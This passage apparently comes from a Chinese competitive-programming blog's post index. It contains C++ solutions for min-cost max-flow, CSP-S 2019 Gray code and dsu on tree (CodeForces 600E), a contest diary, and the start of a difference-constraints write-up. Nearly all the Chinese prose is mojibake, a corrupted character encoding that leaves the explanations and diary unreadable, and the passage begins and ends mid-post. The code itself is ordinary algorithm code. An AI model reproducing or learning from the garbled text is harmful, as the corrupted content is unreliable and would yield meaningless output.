å®¹é‡ä¸º$inf$,è´¹ç”¨ä¸º$0$ çš„è¾¹,è¡¨ç¤ºä¿ç•™ è·‘æœ€å°è´¹ç”¨æœ€å¤§æµ ä»£ç 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889#include &lt;bits/stdc++.h&gt;using namespace std;typedef long long LL;inline int read() { int x = 0; int f = 1; char ch = getchar(); while (!isdigit(ch)) {if (ch == '-') f = -1; ch = getchar();} while (isdigit(ch)) {x = x * 10 + ch - 48; ch = getchar();} return x * f;}const int maxn = 4010;const int inf = 0x3f3f3f3f;int n, m, s, t, ansflow, r[maxn];int vis[maxn], d[maxn], p[maxn], a[maxn];long long anscost;struct Edge { int from, to, cap, flow, cost; Edge(int u, int v, int c, int f, int w): from(u), to(v), cap(c), flow(f), cost(w){}};vector&lt;Edge&gt; edges;vector&lt;int&gt; G[maxn];void add(int u, int v, int c, int w) { edges.push_back(Edge(u, v, c, 0, w)); edges.push_back(Edge(v, u, 0, 0,-w)); int mm = edges.size(); G[u].push_back(mm - 2); G[v].push_back(mm - 1);}bool BellmanFord(int&amp; flow, long long&amp; cost) { for (int i = 1; i &lt;= n; ++i) d[i] = inf; memset(vis, 0, sizeof(vis)); d[s] = 0; vis[s] = 1; p[s] = 0; a[s] = inf; queue&lt;int&gt; Q; Q.push(s); while (!Q.empty()) { int x = Q.front(); Q.pop(); vis[x] = 0; for (int i = 0; i &lt; G[x].size(); ++i) { Edge&amp; e = edges[G[x][i]]; if (e.cap &gt; e.flow &amp;&amp; d[e.to] &gt; d[x] + e.cost) { d[e.to] = d[x] + e.cost; p[e.to] = G[x][i]; a[e.to] = min(a[x], e.cap - e.flow); if (!vis[e.to]) { Q.push(e.to); vis[e.to] = 1; } } } } if (d[t] == inf) return false; flow += a[t]; cost += (long long)d[t] * (long long)a[t]; for (int u = t; u != s; u = edges[p[u]].from) { edges[p[u]].flow += a[t]; edges[p[u] ^ 1].flow -= a[t]; } return true;}int MinCostMaxFlow(long long&amp; cost) { int flow = 0; cost = 0; while (BellmanFord(flow, cost)); return flow;}int main() { int N = read(); s = 0; t = 2 * N + 1; n = t + 1; for (int i = 1; i &lt;= N; ++i) { r[i] = read(); add(s, i + N, r[i], 0); add(i, t, r[i], 0); } int pr = read(), t1 = read(), c1 = read(), t2 = read(), c2 = read(); for (int i = 1; i &lt;= N; ++i) { if (i + 1 &lt;= N) add(i + N, i + N + 1, inf, 0); if (i + t1 &lt;= N) add(i + N, i + t1, inf, c1); if (i + t2 &lt;= N) add(i + N, i + t2, inf, c2); add(s, i, inf, pr); } MinCostMaxFlow(anscost); printf(&quot;%lld\\n&quot;, anscost); return 0;}","link":"/p/93562de2.html"},{"title":"ã€ŒCSP-S 2019ã€é¢˜è§£","text":"~~ä»Šå¹´çš„é¢˜çœŸæ˜¯æ¯’ç˜¤~~,ä¸€ä¸ªè’Ÿè’»è¦æ¥å†™é¢˜è§£äº† æ ¡é—¨å¤–æœ‰ä¸¤æ£µæ ‘,ä¸€æ£µå«æ‹¬å·æ ‘ä¸€æ£µå«æ ‘ä¸Šçš„æ•°,è¿™ä¸¤æ£µæ ‘è¦è¢«ä¸€åŒ¹å«æ ¼é›·çš„é©¬åˆ’åˆ†å¼€ä¸ºEmiyaåšé¥­,è¿™ä¸¤æ£µæ ‘é—®:é‚£ä½ çŒœçŒœæˆ‘ä»¬çš„é‡å¿ƒåœ¨å“ªå•Š $D1T1$ æ ¼é›·ç æ²™é›•æš´åŠ›dfs(æˆ‘çš„åšæ³•)è€ƒåœºä¸ŠçœŸæ˜¯è„‘æ®‹äº†,æ‹¿dfsæ¨¡æ‹Ÿ,å¿˜äº†äºŒåˆ†çš„äº‹äº†,è¿˜ä¼ äº†å››ä¸ªå‚æ•°æ³¨æ„:ä¸€å®šè¦ç”¨unsigned long long 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#include &lt;iostream&gt;#include &lt;cstdio&gt;#include &lt;algorithm&gt;#include &lt;cstdlib&gt;#include &lt;cstring&gt;#include &lt;ctype.h&gt;using namespace std;typedef unsigned long long ull;inline ull read() { ull x = 0, f = 1; char ch = getchar(); while (!isdigit(ch)) { if (ch == '-') f = -1; ch = getchar(); } while (isdigit(ch)) { x = x * 10 + ch - 48; ch = getchar(); } return x * f;}const int maxn = 64;ull n, k;void dfs(ull n, ull k, ull rev, ull from) { if (n == 1) { if (rev == 0) { if (k == 0) printf(&quot;0&quot;); else printf(&quot;1&quot;); } else { if (k == 0) printf(&quot;1&quot;); else printf(&quot;0&quot;); } return; } if (k &lt;= (1LL &lt;&lt; (n - 1LL)) - 1LL) { if (rev == 0 &amp;&amp; from == 0) { printf(&quot;0&quot;); dfs(n - 1LL, k, 0LL, 0LL); } else if (rev == 0 &amp;&amp; from == 1) { printf(&quot;0&quot;); dfs(n - 1LL, k, 1LL, 0LL); } else if (rev == 1 &amp;&amp; from == 0) { printf(&quot;1&quot;); dfs(n - 1LL, k, 0LL, 0LL); } else { printf(&quot;1&quot;); dfs(n - 1LL, k, 0LL, 0LL); } } else { if (rev == 0 &amp;&amp; from == 0) { printf(&quot;1&quot;); dfs(n - 1LL, k - (1LL &lt;&lt; (n - 1LL)), 1LL, 1LL); } else if (rev == 1 &amp;&amp; from == 0) { printf(&quot;0&quot;); dfs(n - 1LL, k - (1LL &lt;&lt; (n - 1LL)), 0LL, 1LL); } else if (rev == 0 &amp;&amp; from == 1) { printf(&quot;1&quot;); dfs(n - 1LL, k - (1LL &lt;&lt; (n - 1LL)), 0LL, 1LL); } else { printf(&quot;0&quot;); dfs(n - 1LL, k - (1LL &lt;&lt; (n - 1LL)), 1LL, 1LL); } }}int main() { n = read(); k = read(); dfs(n, k, 0, 0); printf(&quot;\\n&quot;); return 0;}/* 55ms 812kB */ äºŒåˆ†æ¨¡æ‹Ÿ($lyd$å·¨ä½¬çš„åšæ³•)è€ƒå‰åšè¿‡ä¸€é“ç±»ä¼¼çš„é¢˜,ä½†å¯æƒœæˆ‘å¿˜äº†$lyd$å·¨ä½¬è¯´ä»–è¿™é¢˜åªåšäº†15åˆ†é’Ÿ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include&lt;cstdio&gt;#include&lt;cstdlib&gt;#include&lt;iostream&gt;#include&lt;algorithm&gt;using namespace std;unsigned long long n,k;unsigned long long two[65];int change=0;int main(){ two[0]=1; for(int i=1;i&lt;=63;i++) { two[i]=two[i-1]*2; } cin&gt;&gt;n&gt;&gt;k; while(n&gt;0) { if(k&gt;=two[n-1]) { if(!change) { printf(&quot;1&quot;); change^=1; } else { printf(&quot;0&quot;); } k-=two[n-1]; } else { if(change) { printf(&quot;1&quot;); change^=1; } else { printf(&quot;0&quot;); } } n--; } return 0;}/* 57ms 928kB */ ä½è¿ç®—æ­£è§£æ ¼é›·ç çš„è§„å¾‹å°±æ˜¯ç¬¬$i$ä½ä¸º$k\\ xor\\ \\lfloor\\frac{k}{2}\\rfloor$çš„ç¬¬$i$ä½ 12345678910111213141516#include &lt;bits/stdc++.h&gt;using namespace std;int n;unsigned long long k;int main() { scanf(&quot;%d %llu&quot;, &amp;n, &amp;k); k ^= (k &gt;&gt; 1); while (n--) { printf(&quot;%d&quot;, (k &gt;&gt; n &amp; 1)); } puts(&quot;&quot;); return 0;}/* 54ms 932kB */ $D1T2$ æ‹¬å·æ ‘åé¢çš„å…ˆå’•ç€,ç­‰ç€è¡¥ $D1T3$ æ ‘ä¸Šçš„æ•°$D2T1$ $Emiya$å®¶ä»Šå¤©çš„é¥­$D2T2$ åˆ’åˆ†$D2T3$ æ ‘çš„é‡å¿ƒ","link":"/p/7d7252b1.html"},{"title":"ã€ŒCSP-S 2019ã€è‡ªé—­æ¸¸è®°","text":"è¿™æ¬¡å¤§æ¦‚æ˜¯ç¬¬äºŒå¹´å‚åŠ ä¿¡æ¯ç«èµ›äº†(è™½ç„¶å»å¹´ä»€ä¹ˆä¹Ÿä¸ä¼šå°±æ‘¸äº†110åˆ†,çœå››)æŒ‰ç…§æƒ¯ä¾‹,è¯¥å†™ç¯‡æ¸¸è®°(æµæ°´è´¦)äº† $Day\\ \\ -7\\sim -2$æœ¬æ¥è¿˜æ˜¯æŒºæœ‰ä¿¡å¿ƒçš„,æ ¡å†…å‡ åæ¬¡æ¨¡æ‹Ÿèµ›è€ƒè‡ªé—­äº†,æƒ³æƒ³å¤èµ›ç»“æŸåå‘¨ä¸€å‘¨äºŒå°±è¦æœŸä¸­è€ƒè¯•(å…¶å®æ˜¯â€è´´å¿ƒâ€çš„å¹´çº§ç»„ç‰¹æ„ä¸ºæˆ‘ä»¬OIerè°ƒçš„)æ›´è‡ªé—­äº†æ™šé¥­å›æ¥å,å‡ ä¸ªæ²™é›•æœ‹å‹å¬è¯´æˆ‘è‡ªé—­äº†,å›´äº†ä¸€åœˆç»™æˆ‘æ¥äº†ä¸€éå¥¥åˆ©ç»™,çœŸçš„æ„ŸåŠ¨å›å®¶å’Œçˆ¶æ¯å•†é‡å¥½,ç­¾äº†ä¸ªç”³è¯·ä¹¦è„±äº†ä¸€å‘¨äº§,è¿˜è¯´è®©æˆ‘ä¸“å¿ƒå­¦ä¿¡æ¯,æœŸä¸­è€ƒè¯•å…ˆæ”¾ä¸‹ è„±äº§çš„æ—¶å…‰è¿˜æ˜¯å¾ˆå¿«ä¹çš„æ—©ä¸Šå…­ç‚¹å¤šåˆ°æ ¡å°±å¼€å§‹æ•´ç†æ¨¡æ¿,åˆ·æ¨¡æ¿é¢˜è€å¸ˆåˆ°äº†ä¹‹åèŠ±ä¸‰ä¸ªåŠå°æ—¶åšæ¨¡æ‹Ÿé¢˜ä¸‹åˆè‡ªä¹ å’Œ$zty$å·¨ä½¬ç ”ç©¶é—®é¢˜å››å¤©å°±è¿™ä¹ˆè¿‡å»äº†,æ‰“äº†ä¸€æœ¬å­æ¨¡æ¿å¸¦å»çœåŸå¤ä¹  $Day\\ \\ -1$ä¸Šåˆåä¸€ç‚¹å’Œæœºæˆ¿$wjh$,$mjc$,$lyd$(lyd AK IOI)å‡ºå‘å»è½¦ç«™äº†è¿˜æ˜¯å»å¹´çš„æ—¶é—´,è¿˜æ˜¯å»å¹´çš„$KFC$,è¿˜æ˜¯å»å¹´çš„åƒåœ¾ç¬”è®°æœ¬çœ‹çš„æ˜¯ç´¯ç§¯äº†ä¸€å¹´çš„æ•°åƒè¡Œæ¨¡æ¿å’Œç»éªŒ ä¸­åˆåˆ°äº†å»å¹´åŒæ ·çš„é…’åº—,æ™šä¸Šå»äº†å»å¹´åŒæ ·çš„å‰å¤§æ—¥æ–°æ¥¼åƒé¥­å›åˆ°é…’åº—,$lyd$å·¨ä½¬ç»™åŒå­¦è®²çˆ†æœæŠ€å·§,$zyc$å­¦é•¿åƒå»å¹´ä¸€æ ·æ¥æ¢æœ›è‹¦é€¼çš„$yzOIer$ç¡å‰æ•²äº†ä¸€å †æ¿å­:å¿«è¯»,vimé…ç½®,STè¡¨,æ ‘çŠ¶æ•°ç»„,Trieæ ‘,æ ‘çš„é‡å¿ƒ,æ ‘çš„ç›´å¾„ $Day\\ \\ 1$è¿˜æ˜¯åœ¨å»å¹´çš„ç­‰å€™å®¤ è¿›è€ƒåœº$???$è¿™é˜²çª¥è†œæ˜¯ä»€ä¹ˆé¬¼,ä»€ä¹ˆéƒ½æŒ¡ä¸äº†çš„å¥½å§,çœ‹ç€è¿˜è¶…éš¾å—å‰æ’çš„ç¯ä¹Ÿæ²¡æœ‰å¼€,æ²¡å¼€è€ƒçœ¼ç›å°±ç”Ÿç–¼ $Day1\\ T1$çœ‹è§é¢˜ç›®,emmmæ€ä¹ˆåšéƒ½å‘Šè¯‰ä½ äº†,å¼€ä¸ªæ•°ç»„reverseæ¨¡æ‹Ÿå‘—â€¦emmmä¸å¯¹,æ•°ç»„çš„è¯è²Œä¼¼è¦å¼€$2^64$,ä¸è¡Œä¸è¡Œæ¨è§„å¾‹,å¥½åƒä¹Ÿå°±é‚£ä¹ˆä¸ªæ„æ€,dfsæ¨¡æ‹Ÿ!!ç„¶åä¸€é¡¿ä¹±æ,dfsä¼ å€¼ä»2åˆ°3åˆ°4,å†™äº†å¥½å‡ åè¡Œdfsè·‘ä¸€è¾¹æ ·ä¾‹,æ²¡é—®é¢˜,å¤§æ ·ä¾‹??å¥½åƒçˆ†äº†,æ”¹long longâ€¦ç…§æ ·çˆ†çœ‹ä¸€çœ¼æ—¶é—´,è‰¹ä¸€ä¸ªå°æ—¶äº†,å¾—äº†å¾—äº†,ä¸æ”¹äº† çœ‹å®Œç¬¬äºŒé¢˜,ä¸è¡Œä¸è¡Œ,å¾—æ”¹å®Œ,$2^64$?ä¸æ˜¯unsigned long longå—åˆåŠ äº†å¸¸æ•°çš„è½¬æ¢æ“ä½œ,å¤§æ¦‚å¯ä»¥äº† æ­¤æ—¶ä¸€ä¸ªåŠå°æ—¶è¿‡å»äº†â€¦ $Day1\\ T2$emmmæ‹¬å·åŒ¹é…,é å‰çœ‹è¿‡ç±»ä¼¼çš„,å¥½åƒå¾—ç”¨æ ˆä¸€é¡¿ä¹±æ,å‘ç°å®¡é”™é¢˜äº†â€¦æ ‘ä¸Š??æˆ‘åº”è¯¥ä¸ä¼š,åšé“¾çš„å°æ•°æ®$35$åˆ†å¾—äº†è‡ªå·±å‡ºäº†å‡ ä¸ªæ ·ä¾‹(å…¶å®æ˜¯æ²¡å‘ç°å¤§æ ·ä¾‹æœ‰é“¾ä¸Šæƒ…å†µ),ç”¨äº†$multiset,stack$ä¹±æ,éƒ½è¿‡äº†,å°±æ‰”ä¸‹å»çœ‹ç¬¬ä¸‰é¢˜äº† $Day1\\ T3$é¢˜ç›®ç»•äº†ååˆ†å¤šç§,çœ‹äº†å¥½å‡ éæ ·ä¾‹æ‰æ˜ç™½é¢˜å¹²è¿™å’‹åšå•Š,æ­£è§£è‚¯å®šä¸ä¼š,é“¾å’ŒèŠèŠ±å›¾æƒ³äº†åŠä¸ªå¤šå°æ—¶æ²¡æƒ³å‡ºæ¥ æœ€åå‰©äºŒååˆ†é’Ÿäº†,ä¸è¿˜æ˜¯æœ‰$n!$çš„æš´åŠ›$10$åˆ†å—é£é€Ÿå†™å®Œä»£ç ,ç¼–è¯‘â€¦vectoræ²¡æœ‰???ä¸åº”è¯¥å•Š,æ”¹äº†å¥½å¤šéä¹Ÿè¿‡ä¸äº†,æ‹‰å€’,éšæœºæ•°å§â€¦éšæœºæ•°æ¦‚ç‡å¤ªå°,ä»$1\\sim n$ä¾æ¬¡è¾“å‡º.. å…¶å®ç¼–è¯‘æ²¡è¿‡æ˜¯æ²¡æœ‰åŠ using namespace std; ä¸­åˆè€å¸ˆè¯·å®¢å»äº†å»å¹´åŒæ ·çš„é¥­åº—,ä¸‹åˆå»äº†å»å¹´åŒæ ·çš„æ¬¢ä¹åŸæ”¾æ¾è‡ªæš´è‡ªå¼ƒ$day1$ä¼°åˆ†$135$,å®Œäº†,æ˜å¤©å¾—è€ƒä¸€ç™¾å¤šåˆ†æ‰ç¨³â€¦ æ™šä¸Šç¡å‰åˆçœ‹äº†çœ‹ä¸€å¤©ä»€ä¹ˆæ²¡ç”¨ä¸Šçš„æ¨¡æ¿ $Day\\ \\ 2$åœ¨ç­‰å€™å®¤çœ‹äº†æ ‘çš„é‡å¿ƒ,æ ‘çš„ç›´å¾„çš„æ¨¡æ¿æˆ‘è·Ÿlydè¯´:æ˜¨å¤©æ²¡è€ƒ,ä»Šå¤©è‚¯å®šæœ‰ $Day2\\ T1$è®¤çœŸçš„å®¡äº†é¢˜,æƒ³è¦$AC$ç”»äº†æ ·ä¾‹çš„å›¾,wocäºŒåˆ†å›¾,ç½‘ç»œæµ???å®Œäº†å®Œäº†,è€ƒå‰æ²¡çœ‹,æ‰”ä¸‹ä¸€ä¸ª$32$åˆ†$n!$æš´åŠ›æºœäº† å…¶å®å·²ç»èŠ±äº†ä¸€ä¸ªå°æ—¶äº† $Day2\\ T3$ç¬¬äºŒé¢˜æ²¡çœ‹æ‡‚é¢˜é¢,çœ‹åˆ°ç¬¬ä¸‰é¢˜é¢˜ç›®æˆ‘å°±æ¥äº†$???$è¿™ä¸ªé‡å¿ƒå®šä¹‰å’Œæˆ‘å¤ä¹ çš„ä¸ä¸€æ ·,å¤§ä½“æ€æƒ³å·®ä¸å¤š,å¼€å†™ æ”¹äº†æ¨¡æ¿,å†™äº†ä¸Šå»,å‘ç°åˆ†å‰²æ ‘???ä»¥å‰æ²¡åšè¿‡,åªå¥½é‡æ–°å»ºå›¾,åˆ ä¸€æ¡è¾¹å»ºä¸€æ¬¡å›¾è¾£é¸¡æ•ˆç‡è·‘å®Œ???é‡å¿ƒå…¨æ˜¯$2$,æŸ¥äº†åŠå¤©å‘ç°ä¸¤æ£µæ ‘çš„èŠ‚ç‚¹æ•°æ²¡å¤„ç†â€¦æ”¹è¿‡æ¥ä¹‹åå‰å‡ ä¸ªç‚¹$25$åˆ†åº”è¯¥æ˜¯æ²¡é—®é¢˜äº† ç®€å•æ¨äº†ä¸‹é“¾å’Œå®Œç¾äºŒå‰æ ‘,æ²¡æ¨å‡ºæ¥,æ”¾å¼ƒâ€¦è€ƒè¯•ç»“æŸå‰ä¹Ÿæ²¡æƒ³å‡ºæ¥ $Day2\\ T2$ç…§ç€æ ·ä¾‹çœ‹äº†ååˆ†é’Ÿæ‰æ˜ç™½é¢˜ç›®å•¥æ„æ€æ„Ÿè§‰åº”è¯¥æ˜¯$DP$,ä½†è’Ÿè’»ä¸ä¼š$DP$å•Šç®—äº†,çå†™ä¸ªçŠ¶æ€è½¬ç§»æ–¹ç¨‹å§,ä¹±æâ€¦å‘ç°ä¸æ˜¯æœ€ä¼˜è§£,ç„¶åå¤„ç†åˆ†å—è¿˜æœ‰è´ªå¿ƒä»€ä¹ˆçš„æ”¹äº†ä¸€ä¸ªå°æ—¶è¿˜æ˜¯ä¸å¯¹,å¿ƒæƒ³ç®—äº†,çˆ†é›¶äº†,1=æ— ç¼˜äº†,åˆå›å»æ¨é“¾çš„é‡å¿ƒ è€ƒè¯•ç»“æŸå‰,å‡†å¤‡æäº¤ä»£ç ,æŠŠè¿™é¢˜ä¸­é—´å‡ è¡Œæ²¡ç”¨çš„åˆ äº†åˆ (åˆ å°‘äº†å‡ è¡Œ),å†è·‘ä¸€é,å¥‡è¿¹èˆ¬çš„å¯¹äº†æµ‹äº†ä¸€ä¸‹å‡ ä¸ªæ ·ä¾‹,$0\\to 64\\ \\ ???$ ä¼°åˆ†$100+35+0+32+64+25=256$,æœ‰ç‚¹æ‚¬ ä¸‹åˆåˆ·æ´›è°·,æ©™è“é»‘ç´«é»‘ç´«â€¦ç‚¸äº†(ç°åœ¨æ‰è‰²äº†)æ™šä¸Šä»è½¦ç«™å›å®¶åœ¨å¤§é›ªé‡Œæ‰“è½¦åŠä¸ªå°æ—¶,åˆ°å®¶é¢“åºŸ,ç¬¬äºŒå¤©çš„æœŸä¸­å½»åº•æ”¾å¼ƒ $Day\\ \\ 3\\sim 4$æœŸä¸­è€ƒè¯•ç¬¬ä¸€å¤©å¼€å¹•é›·å‡»,è¯­æ–‡å¤æ–‡æ²¡èƒŒè¿‡,ä½œæ–‡ä¸»æ—‹å¾‹,ç„¶åä¸‰ç§‘ä¸€ä¸ªæœˆæ²¡å­¦çš„æ–‡ç§‘,è¿˜æœ‰ä»€ä¹ˆéƒ½æ²¡å¤ä¹ çš„è‹±è¯­ å›å®¶,è€å¸ˆä¼ äº†å…¬ç¤ºä»£ç ,å»$luogu$æ°‘é—´æ•°æ®è‡ªæµ‹$Day1\\ T2\\ \\ 35\\to 0\\ 256\\to 221$ 1=æ²¡å¸Œæœ›,å½»åº•è‡ªé—­äº†,è¦$AFO$äº† $Day\\ \\ 5\\sim 6$ä¸­åˆå»æœºæˆ¿æŠŠä¸œè¥¿æ”¶æ‹¾åˆ°å°å±‹é‡Œ,$zty,lyd$å·¨ä½¬å·²ç»å¼€å§‹å‡†å¤‡çœé€‰æœŸä¸­æˆç»©é™†ç»­å‡ºæ¥äº†,æ€»ä½“æ¥è¯´è¿˜å¯ä»¥ ä¸­åˆå’Œ$zty$ç”¨lemonæŠŠå…¨çœä»£ç æ‹¿æ°‘é—´æ•°æ®è·‘äº†ä¸€é,æ’åè¿˜å¯ä»¥,è²Œä¼¼è¿˜æœ‰å¸Œæœ› ç»“è™½ç„¶è€ƒçš„å¾ˆæ°´,ä½†å­¦$OI$æˆ‘ç»ä¸åæ‚”æ¥ä¸‹æ¥è¦åŠªåŠ›æ¡èµ·æ–‡åŒ–è¯¾äº† æ–‡åŒ–è¯¾è™½è¯´æ¶å¿ƒï¼Œä½†åªæœ‰ä¸€å¹´ï¼Œä¸€å¹´å®Œäº†å°±èƒ½è¯»å¤§å­¦äº†ï¼Œé«˜è€ƒå°±ä¸ä½ æ— å…³äº†ã€‚ â€”$zcysky$ åŠ æ²¹!å¥¥åˆ©ç»™!!","link":"/p/1901119c.html"},{"title":"ã€Œå›¾è®ºç®—æ³•ã€æ ‘ä¸Šå¹¶æŸ¥é›† dsu on tree","text":"$dsu\\ on\\ tree$($disjoint\\ set\\ union\\ \\text{on tree}$)ç®—æ³•ï¼Œä¹Ÿç§° __æ ‘ä¸Šå¹¶æŸ¥é›†__ã€‚ä½¿ç”¨äº†å¹¶æŸ¥é›†çš„æŒ‰ç§©åˆå¹¶(å¯å‘å¼åˆå¹¶)çš„æ–¹æ³•ï¼Œç»“åˆ æ ‘é“¾å‰–åˆ† ä¸­çš„ è½»é‡å„¿å­åˆ’åˆ† ï¼Œå¯¹ æ ‘ä¸Šæš´åŠ›ç»Ÿè®¡ è¿›è¡Œäº†ä¼˜åŒ–ã€‚ä½¿ç”¨è¿™ä¸ªç®—æ³•éœ€è¦æ»¡è¶³ä»¥ä¸‹ä¸¤ä¸ªæ¡ä»¶ï¼š æ¯æ¬¡åªå¯¹å­æ ‘è¿›è¡ŒæŸ¥è¯¢ è¿‡ç¨‹ä¸­æ²¡æœ‰å¯¹æ ‘çš„ä¿®æ”¹ å¯ä»¥å°†$O(n^2)$çš„æš´åŠ›æ“ä½œä¼˜åŒ–åˆ°$O(n\\log_2n)$ $pre.\\ $æ ‘é“¾å‰–åˆ† - è½»é‡é“¾åˆ’åˆ†åœ¨$dsu\\ on\\ tree$ç®—æ³•ä¸­ï¼Œåªéœ€è¦ç»Ÿè®¡å‡ºæ¯ä¸ªèŠ‚ç‚¹çš„è½»é‡å„¿å­ï¼Œè€Œä¸éœ€è¦åˆ’åˆ†è½»é‡é“¾ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦æ ‘é“¾å‰–åˆ†ä¸­çš„$\\texttt{dfs1()}$ï¼Œå¹¶ä¸”åªä¿ç•™å’Œè½»é‡å„¿å­æœ‰å…³çš„æ“ä½œå³å¯ å…³äº è½»é‡å„¿å­ ï¼š ä¸€ä¸ªèŠ‚ç‚¹çš„æ‰€æœ‰å­èŠ‚ç‚¹ä¸­ï¼Œå­æ ‘æ‰€å«èŠ‚ç‚¹ä¸ªæ•°æœ€å¤šçš„å­èŠ‚ç‚¹ç§°ä¸º é‡å„¿å­ é™¤é‡å„¿å­å¤–ï¼Œä¸€ä¸ªèŠ‚ç‚¹çš„å…¶ä½™å„¿å­å‡ä¸º è½»å„¿å­ 123456789101112void dfs1(int x, int fa) { siz[x] = 1; // ä»¥xä¸ºæ ¹çš„å­æ ‘å¤§å°åˆå§‹åŒ–ä¸º1 for (int i = 0; i &lt; G[x].size(); ++i) { Edge&amp; e = edges[G[x][i]]; if (e.to == fa) continue; dfs1(e.to, x); siz[x] += siz[e.to]; // åŠ ä¸Šå­èŠ‚ç‚¹çš„å¤§å° if (siz[e.to] &gt; siz[son[x]]) { son[x] = e.to; // æ›´æ–°é‡å„¿å­ } }} $I.\\ $ç®—æ³•æµç¨‹å¯¹äºæ¯ä¸€ä¸ªèŠ‚ç‚¹$x$: éå†æ‰€æœ‰å­èŠ‚ç‚¹ é€’å½’è®¡ç®—æ‰€æœ‰è½»å„¿å­çš„å­æ ‘ï¼Œå¹¶åˆ é™¤å…¶å¯¹ç­”æ¡ˆçš„è´¡çŒ® é€’å½’è®¡ç®—é‡å„¿å­ï¼Œä¿ç•™å¯¹ç­”æ¡ˆçš„è´¡çŒ® ç»Ÿè®¡æ‰€æœ‰è½»å„¿å­å¯¹ç­”æ¡ˆçš„è´¡çŒ® æ›´æ–°èŠ‚ç‚¹ç­”æ¡ˆ ä¼ªä»£ç ï¼š 123456789101112void dfs(int x, int fa, int opt) { for (all edge from x) { if (e.to == fa || e.to == son[x]) continue; dfs(e.to, x, 0); // æš´åŠ›ç»Ÿè®¡è½»å„¿å­çš„å­æ ‘çš„è´¡çŒ®ï¼Œå¹¶åˆ é™¤(opt=0) } if (son[x]) dfs(son[x], x, 1); // ç»Ÿè®¡é‡å„¿å­çš„è´¡çŒ®ï¼Œä¸åˆ é™¤ upd(x); // æš´åŠ›ç»Ÿè®¡è¯¥èŠ‚ç‚¹æ‰€æœ‰è½»å„¿å­çš„è´¡çŒ® ans[x] = now; // æ›´æ–°ç­”æ¡ˆ if (!opt) { del(x); // åˆ é™¤éœ€è¦åˆ é™¤çš„è´¡çŒ® }} 12345678void upd(int x, int fa, int val) { solve(x); // è®¡ç®—å½“å‰ç­”æ¡ˆ for (int i = 0; i &lt; G[x].size(); ++i) { Edge&amp; e = edges[G[x][i]]; if (e.to == fa || e.to == Son) continue; upd(e.to, x, val); }} ç”±äºæš´åŠ›ç»Ÿè®¡çš„åªæ˜¯è½»å„¿å­ï¼Œè€Œæ¯ä¸ªèŠ‚ç‚¹çš„è½»å„¿å­ä¸è¶…è¿‡$\\log_2n$ä¸ªï¼Œæ‰€ä»¥æ•´ä¸ªç®—æ³•å¤æ‚åº¦ä¿è¯åœ¨äº†$O(n\\log_2n)$ $II.\\ $æ¨¡æ¿é¢˜$CodeForces\\ 600E\\ \\ Lomsat\\ gelral$ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889#include &lt;bits/stdc++.h&gt;using namespace std;inline int read() { int x = 0; int f = 1; char ch = getchar(); while (!isdigit(ch)) {if (ch == '-') f = -1; ch = getchar();} while (isdigit(ch)) {x = x * 10 + ch - 48; ch = getchar();} return x * f;}const int maxn = 100010;struct Edge { int from, to; Edge(int u, int v): from(u), to(v) {}};vector&lt;Edge&gt; edges;vector&lt;int&gt; G[maxn];void add(int u, int v) { edges.push_back(Edge(u, v)); int mm = edges.size(); G[u].push_back(mm - 1);}int n, Mx, Son, col[maxn], son[maxn], siz[maxn], cnt[maxn];long long sum = 0, ans[maxn];void dfs1(int x, int fa) { siz[x] = 1; for (int i = 0; i &lt; G[x].size(); ++i) { Edge&amp; e = edges[G[x][i]]; if (e.to == fa) continue; dfs1(e.to, x); siz[x] += siz[e.to]; if (siz[e.to] &gt; siz[son[x]]) { son[x] = e.to; } }}void Add(int x, int fa, int val) { cnt[col[x]] += val; if (cnt[col[x]] &gt; Mx) { Mx = cnt[col[x]]; sum = col[x]; } else if (cnt[col[x]] == Mx) { sum += (long long)col[x]; } for (int i = 0; i &lt; G[x].size(); ++i) { Edge&amp; e = edges[G[x][i]]; if (e.to == fa || e.to == Son) continue; Add(e.to, x, val); }}void dfs2(int x, int fa, int opt) { for (int i = 0; i &lt; G[x].size(); ++i) { Edge&amp; e = edges[G[x][i]]; if (e.to == fa) continue; if (e.to != son[x]) dfs2(e.to, x, 0); } if (son[x]) { dfs2(son[x], x, 1); Son = son[x]; } Add(x, fa, 1); Son = 0; ans[x] = sum; if (!opt) { Add(x, fa, -1); sum = 0, Mx = 0; }}int main() { n = read(); for (int i = 1; i &lt;= n; ++i) { col[i] = read(); } for (int i = 1; i &lt; n; ++i) { int u = read(), v = read(); add(u, v); add(v, u); } dfs1(1, 0); dfs2(1, 0, 0); for (int i = 1; i &lt;= n; ++i) { printf(&quot;%lld &quot;, ans[i]); } return 0;}","link":"/p/da7e0a9d.html"},{"title":"ã€ŒLuogu P1993ã€å°Kçš„å†œåœº-é¢˜è§£ &amp; å·®åˆ†çº¦æŸç³»ç»Ÿ","text":"é¢˜ç›®ä¼ é€é—¨: ã€ŒLuogu P1993ã€å°Kçš„å†œåœº é¢˜ç›®å¤§æ„ç»™å‡º$m$ä¸ªçº¦æŸæ¡ä»¶,$n$ä¸ªå†œåœºæœ‰ä¸‰ç§æ¡ä»¶,å…¶ä¸­$a,b$è¡¨ç¤ºç¼–å·ä¸º$a,b$çš„å†œåœºçš„æ¤ç‰©ä¸ªæ•° $a-bâ‰¥c$ $a-bâ‰¤c$ $a=b$æ±‚æ˜¯å¦å­˜åœ¨ä¸€ç§æ–¹æ¡ˆ,ä½¿å†œåœºä¸­çš„æ¤ç‰©æ•°æ»¡è¶³çº¦æŸè¦æ±‚ $I.$ å·®åˆ†çº¦æŸç³»ç»Ÿä»¥ç¬¬$1$ç§çº¦æŸä¸ºä¾‹:$$a-b\\ge c\\Rightarrow b\\le a+(-c)$$ä¸æ±‚æœ€çŸ­è·¯å¾„ä¸­çš„ä¸‰è§’å½¢ä¸ç­‰å¼$dis[e.to]\\le dis[u] + e.val$ç±»ä¼¼æ‰€ä»¥æˆ‘ä»¬å¯¹äºçº¦æŸæ¡ä»¶$a-b\\ge c$,ä»$a$åˆ°$b$å»ºä¸€æ¡è¾¹æƒä¸º$-c$çš„è¾¹åŒç†ä¸‰ç§çº¦æŸæ¡ä»¶ä¾æ¬¡ä¸º $a-b\\ge c$, ä»$a$åˆ°$b$å»º$-c$å•å‘è¾¹ $a-b\\le c$, 